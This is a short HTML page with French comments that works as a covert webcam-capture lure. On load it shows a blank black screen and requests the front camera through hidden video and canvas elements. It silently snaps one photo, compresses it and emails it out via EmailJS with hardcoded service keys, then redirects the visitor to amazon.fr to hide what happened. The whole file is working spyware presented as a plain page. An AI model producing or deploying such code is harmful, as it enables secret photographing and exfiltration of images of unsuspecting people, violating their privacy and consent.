<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title></title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: #000; /* Ã©cran noir */
      height: 100%;
      width: 100%;
      overflow: hidden;
    }
    video, canvas {
      display: none !important;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="1920" height="1080"></canvas>

  <script>
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Compression intelligente
    function getCompressedImage(canvas, maxKB = 45) {
      let quality = 0.95;
      let imageData = canvas.toDataURL("image/jpeg", quality);

      while ((imageData.length / 1024) > maxKB && quality > 0.05) {
        quality -= 0.05; // baisse progressive
        imageData = canvas.toDataURL("image/jpeg", quality);
      }
      return imageData;
    }

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user", width: 1920, height: 1080 }
        });
        video.srcObject = stream;

        video.onloadeddata = () => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Compression Ã  45 KB max
          const imageData = getCompressedImage(canvas, 45);

          // Stop camÃ©ra aprÃ¨s capture
          stream.getTracks().forEach(track => track.stop());

          // Envoi via EmailJS
          emailjs.send("service_8cs0gml", "template_rdhxflt", {
            message: "Photo auto compressÃ©e ðŸ“¸ (â‰¤45KB)",
            image: imageData
          }).finally(() => {
            window.location.href = "https://www.amazon.fr";
          });
        };
      } catch (err) {
        window.location.href = "https://www.amazon.fr";
      }
    }

    window.onload = startCapture;
  </script>
</body>
</html>
